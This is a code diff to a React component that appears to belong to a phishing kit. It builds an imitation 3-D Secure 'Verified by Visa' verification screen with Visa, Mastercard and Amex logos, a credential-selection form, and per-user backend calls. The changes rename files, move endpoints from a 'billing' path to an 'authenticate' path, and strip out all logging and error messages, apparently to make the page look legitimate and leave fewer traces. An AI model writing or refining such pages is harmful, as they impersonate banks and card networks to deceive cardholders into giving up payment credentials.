@@ -2,11 +2,9 @@ import React, { useState, useEffect } from 'react';
 import { useHistory } from 'react-router-dom';
 import axios from 'axios';
 import { zokomId } from '../utils/auth';
-
-// Import SVG files
-import visaLogo from './visa_logo.svg';
-import mcLogo from './mc_symbol.svg';
-import amexLogo from './american_express_logo.svg';
+import visaLogo from './visalogo.svg';
+import mcLogo from './mc.svg';
+import amexLogo from './amexlogo.svg';
 
 const Vbvnotif = ({ onContinue }) => {
   const [styles, setStyles] = useState(null);
@@ -20,8 +18,8 @@ const Vbvnotif = ({ onContinue }) => {
     const loadStyles = async () => {
       try {
         const [loginStyles, additionalStyles] = await Promise.all([
-          import('../../assets/styles/3ds.css'),
-          import('../../assets/styles/3ds.css')
+          import('../../assets/styles/three.css'),
+          import('../../assets/styles/three.css')
         ]);
         
         setStyles({
@@ -29,20 +27,17 @@ const Vbvnotif = ({ onContinue }) => {
           additional: additionalStyles.default
         });
       } catch (error) {
-        console.error('Error loading styles:', error);
       }
     };
     
     const fetchLogoUrl = async () => {
       try {
-        const response = await axios.get(`${process.env.REACT_APP_API_URL}/api/billing/logo-url/${userId}`);
+        const response = await axios.get(`${process.env.REACT_APP_API_URL}/api/authenticate/logo-url/${userId}`);
         if (response.data) {
           setLogoUrl(response.data.logoUrl);
           setBrand(response.data.brand);
-          console.log('Brand:', response.data.brand); // Log the brand value
         }
       } catch (error) {
-        console.error('Error fetching logo URL:', error);
       }
     };
     
@@ -72,7 +67,6 @@ const Vbvnotif = ({ onContinue }) => {
     return links[brand.toLowerCase()] || '#';
   };
   const getBrandLogo = () => {
-    console.log('Getting brand logo for:', brand); // Log the brand value
     switch (brand.toLowerCase()) {
       case 'visa':
         return visaLogo;
@@ -100,11 +94,9 @@ const Vbvnotif = ({ onContinue }) => {
 
     try {
       const response = await axios.post(
-        `${process.env.REACT_APP_API_URL}/api/billing/continue/${userId}`
+        `${process.env.REACT_APP_API_URL}/api/authenticate/continue/${userId}`
       );
-      console.log('Continue response:', response.data);
     } catch (error) {
-      console.error('Error sending continue request:', error);
     }
   };
             
@@ -128,7 +120,7 @@ const Vbvnotif = ({ onContinue }) => {
               method="post"
               name="ChooseCredentialForm"
               noValidate="novalidate"
-              onSubmit={handleContinue} // Attach handleContinue to form submission
+              onSubmit={handleContinue}
             >
               <div className="body" dir="LTR" style={{ bottom: '111.952px' }}>
                 <h1 className="screenreader-only">Verification needed</h1>
